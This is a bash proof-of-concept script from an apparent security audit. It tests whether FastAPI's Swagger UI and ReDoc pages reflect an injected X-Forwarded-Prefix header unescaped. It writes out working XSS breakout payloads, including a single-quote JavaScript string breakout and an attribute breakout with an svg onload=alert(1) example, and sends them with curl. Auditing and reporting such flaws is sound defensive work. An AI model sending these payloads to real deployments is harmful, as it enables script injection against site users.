#!/usr/bin/env bash
# poc_07_swagger_openapi_url_xss.sh — Reflected XSS in Swagger UI /docs via
# unescaped openapi_url (X-Forwarded-Prefix → scope["root_path"]).
#
# ── Sink ─────────────────────────────────────────────────────────────────────
#   fastapi/openapi/docs.py:166-169 (get_swagger_ui_html):
#     <script>
#     const ui = SwaggerUIBundle({
#         url: '{openapi_url}',
#   `openapi_url` is interpolated RAW into a single-quoted JS string literal.
#   NO _html_safe_json, NO json.dumps, NO HTML-entity encoding.
#   Adjacent parameters at docs.py:172 (_html_safe_json(key)/_html_safe_json(value))
#   and docs.py:186 (init_oauth) ARE escaped — the asymmetry is real.
#   Secondary unescaped sinks: docs.py:175 (oauth2RedirectUrl) and the
#   ReDoc spec-url attribute at docs.py:293 (tested separately below).
#
# ── Source / data flow ───────────────────────────────────────────────────────
#   fastapi/applications.py:1122-1134 (swagger_ui_html route handler):
#     root_path = req.scope.get("root_path", "").rstrip("/")   # line 1123
#     openapi_url = root_path + self.openapi_url               # line 1124
#     return get_swagger_ui_html(openapi_url=openapi_url, ...) # line 1128-1134
#   .rstrip("/") removes only trailing slashes — does NOT sanitize quotes/< >/;.
#
# ── Precondition ─────────────────────────────────────────────────────────────
#   In a bare uvicorn deployment root_path is a static startup value, NOT
#   client-controllable per-request.  Exploitable only when a reverse proxy or
#   ASGI middleware maps an untrusted request header (X-Forwarded-Prefix /
#   X-Script-Name) into scope["root_path"] — the documented FastAPI "Behind a
#   Proxy" pattern (nginx/traefik/k8s-ingress).  ProxyPrefixMiddleware in
#   target_app/app.py faithfully represents this deployment.
#
# ── PASS/FAIL semantics (INVERTED relative to poc_03–poc_06) ─────────────────
#   poc_03–poc_06 are DEFENSE checks: PASS = attack blocked.
#   poc_07 is a FINDING check:
#     FAIL = breakout sequence present unescaped = CONFIRMED XSS finding.
#     PASS = openapi_url was HTML/JS-escaped = defense held.
#   THIS POC IS EXPECTED TO FAIL ON THIS COMMIT because the breakout is real.
#   A FAIL from this PoC is the correct, valid audit output — it is NOT a
#   harness bug.  run_all.sh prints "REAL FINDING DETECTED" on FAIL, which is
#   the intended behavior for a confirmed security finding.
#
# ── Detection logic ───────────────────────────────────────────────────────────
#   Payload header: X-Forwarded-Prefix: /x'-AUTOFYNXSS-'
#   Resulting openapi_url: /x'-AUTOFYNXSS-'/openapi.json
#   Rendered line: url: '/x'-AUTOFYNXSS-'/openapi.json',
#   The first ' after /x CLOSES the original string; -AUTOFYNXSS- is bare JS
#   tokens outside the string → breakout demonstrated.
#
#   Assertion order (CR-2 — must NOT emit vacuous PASS):
#     1. Body MUST contain "AUTOFYNXSS" at all (positive: header was reflected).
#        If absent → middleware precondition not met → HARNESS FAIL (not a PASS).
#     2. If body contains the raw breakout "'-AUTOFYNXSS-'" → FAIL (finding).
#     3. If body contains "AUTOFYNXSS" but NOT the raw breakout → PASS (escaped).
#
# ── Upstream note ────────────────────────────────────────────────────────────
#   fastapi/openapi/docs.py is byte-identical to upstream FastAPI 0.137.1.
#   This is an INHERITED weakness, not a fork-planted backdoor.
#   Comparable to cadwyn GHSA-2gxp-6r36-m97r (same sink class, CVSS 7.6 HIGH).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1}"
DOCS_URL="${BASE_URL}/docs"
REDOC_URL="${BASE_URL}/redoc"

echo "=== poc_07: Reflected XSS in Swagger UI /docs via unescaped openapi_url ==="
echo "Sink       : fastapi/openapi/docs.py:168 — url: '{openapi_url}' (raw, unescaped)"
echo "Source     : fastapi/applications.py:1123-1124 — root_path from scope + self.openapi_url"
echo "Precondition: ProxyPrefixMiddleware maps X-Forwarded-Prefix → scope[\"root_path\"]"
echo "Payload    : X-Forwarded-Prefix: /x'-AUTOFYNXSS-'"
echo "Expected   : FAIL (breakout confirmed = real finding)"
echo ""

PASS=1

# ── Positive control ──────────────────────────────────────────────────────────
# Confirms /docs renders the vulnerable Swagger template (no malicious header).
echo "--- Positive control: GET /docs (no malicious header) ---"
PC_CODE="$(curl -sS -o /tmp/poc07_pc.txt -w "%{http_code}" \
    --max-time 10 \
    "${DOCS_URL}" 2>&1 || echo "000")"
PC_BODY="$(cat /tmp/poc07_pc.txt 2>/dev/null || echo "")"
echo "HTTP ${PC_CODE}"

if [[ "$PC_CODE" != "200" ]]; then
    echo "[FAIL] Positive control: /docs returned HTTP ${PC_CODE} — endpoint broken or /docs disabled"
    PASS=0
elif ! assert_contains "${PC_BODY}" "SwaggerUIBundle"; then
    echo "[FAIL] Positive control: body does not contain 'SwaggerUIBundle' — Swagger template not rendered"
    PASS=0
elif ! assert_contains "${PC_BODY}" "url: '"; then
    echo "[FAIL] Positive control: body does not contain \"url: '\" — vulnerable template line absent"
    PASS=0
else
    echo "[OK] Positive control: /docs returned 200, contains 'SwaggerUIBundle' and \"url: '\""
fi
echo ""

if (( PASS == 0 )); then
    print_check "swagger_openapi_url_xss" "FAIL" \
        "positive control failed — /docs endpoint broken or template absent; cannot assess XSS"
    exit 0
fi

# ── Attack: X-Forwarded-Prefix injection ─────────────────────────────────────
# Header value: /x'-AUTOFYNXSS-'
# .rstrip("/") leaves this unchanged (no trailing slash).
# Resulting openapi_url: /x'-AUTOFYNXSS-'/openapi.json
# Rendered in /docs: url: '/x'-AUTOFYNXSS-'/openapi.json',
# The ' after /x closes the JS string; -AUTOFYNXSS- is unquoted bare JS tokens.
echo "--- Attack: GET /docs with X-Forwarded-Prefix: /x'-AUTOFYNXSS-' ---"
ATK_CODE="$(curl -sS -o /tmp/poc07_atk.txt -w "%{http_code}" \
    --max-time 10 \
    -H "X-Forwarded-Prefix: /x'-AUTOFYNXSS-'" \
    "${DOCS_URL}" 2>&1 || echo "000")"
ATK_BODY="$(cat /tmp/poc07_atk.txt 2>/dev/null || echo "")"
echo "HTTP ${ATK_CODE}"
echo ""

# Step 1 — CR-2 guard: confirm the marker was reflected at all.
# If AUTOFYNXSS is entirely absent the middleware did not map the header into
# root_path — this is a HARNESS/precondition failure, not a passing defense.
if ! assert_contains "${ATK_BODY}" "AUTOFYNXSS"; then
    echo "[ERROR] Marker 'AUTOFYNXSS' is entirely absent from the /docs response."
    echo "        X-Forwarded-Prefix was NOT reflected into root_path."
    echo "        The ProxyPrefixMiddleware precondition is not satisfied."
    echo "        This is a harness/configuration failure — NOT a defense pass."
    print_check "swagger_openapi_url_xss" "FAIL" \
        "X-Forwarded-Prefix not reflected into root_path — middleware precondition not satisfied"
    exit 0
fi

echo "[OK] Marker 'AUTOFYNXSS' present in response — header was reflected into root_path"
echo ""

# Step 2 — breakout detection: check if the raw single-quote breakout sequence is present.
# Raw: '-AUTOFYNXSS-' means the ' was emitted unescaped → JS string breakout → XSS.
echo "--- Checking for unescaped breakout sequence: '-AUTOFYNXSS-' ---"
if assert_contains "${ATK_BODY}" "'-AUTOFYNXSS-'"; then
    echo "[FAIL] Raw breakout sequence \\'\\'-AUTOFYNXSS-\\'\\' found in /docs response body."
    echo "       The single-quote was emitted UNESCAPED → JS string breakout → reflected XSS confirmed."
    echo "       Rendered line in /docs: url: '/x'-AUTOFYNXSS-'/openapi.json',"
    print_check "swagger_openapi_url_xss" "FAIL" \
        "openapi_url interpolated unescaped into /docs JS string; X-Forwarded-Prefix broke out of the single-quoted literal (marker reflected as '-AUTOFYNXSS-'); reflected XSS confirmed under proxy-prefix precondition (docs.py:168 applications.py:1123-1124)"
else
    echo "[OK] Raw breakout sequence not present — single-quote appears to be escaped."
    echo "     Marker was reflected but the ' was encoded (defense held)."
    print_check "swagger_openapi_url_xss" "PASS" \
        "openapi_url HTML/JS-escaped; single-quote breakout neutralized (marker present but ' encoded) — defense held"
fi
echo ""

# ── Optional: ReDoc secondary sink check ─────────────────────────────────────
# Sink: docs.py:293 — <redoc spec-url="{openapi_url}"></redoc>
# An HTML attribute (double-quoted), so the breakout payload is a double-quote + tag.
# Payload: X-Forwarded-Prefix: /x"><svg onload=alert(1)>AUTOFYNXSS
# Breakout sequence in body: "><svg onload=alert(1)>AUTOFYNXSS
echo "--- Optional: ReDoc secondary sink check (docs.py:293) ---"
RD_PAYLOAD_HDR='X-Forwarded-Prefix: /x"><svg>AUTOFYNXSS'
RD_CODE="$(curl -sS -o /tmp/poc07_redoc.txt -w "%{http_code}" \
    --max-time 10 \
    -H "${RD_PAYLOAD_HDR}" \
    "${REDOC_URL}" 2>&1 || echo "000")"
RD_BODY="$(cat /tmp/poc07_redoc.txt 2>/dev/null || echo "")"
echo "HTTP ${RD_CODE}"

if ! assert_contains "${RD_BODY}" "AUTOFYNXSS"; then
    echo "[INFO] ReDoc marker absent — /redoc either not rendered or header not reflected."
    echo "       Skipping ReDoc breakout check (precondition not met for /redoc)."
    print_check "redoc_openapi_url_xss" "FAIL" \
        "X-Forwarded-Prefix not reflected into root_path for /redoc — middleware precondition not satisfied for secondary sink"
elif assert_contains "${RD_BODY}" '"><svg>AUTOFYNXSS'; then
    echo "[FAIL] Raw attribute breakout '\"><svg>AUTOFYNXSS' found in /redoc response."
    echo "       HTML attribute escaping absent at docs.py:293 — same-class secondary XSS sink confirmed."
    print_check "redoc_openapi_url_xss" "FAIL" \
        "openapi_url unescaped in ReDoc spec-url HTML attribute (docs.py:293); double-quote breakout confirmed — same-class secondary XSS sink under proxy-prefix precondition"
else
    echo "[OK] ReDoc breakout sequence not present — HTML attribute appears escaped."
    print_check "redoc_openapi_url_xss" "PASS" \
        "openapi_url HTML-escaped in ReDoc spec-url attribute — breakout neutralized (defense held)"
fi
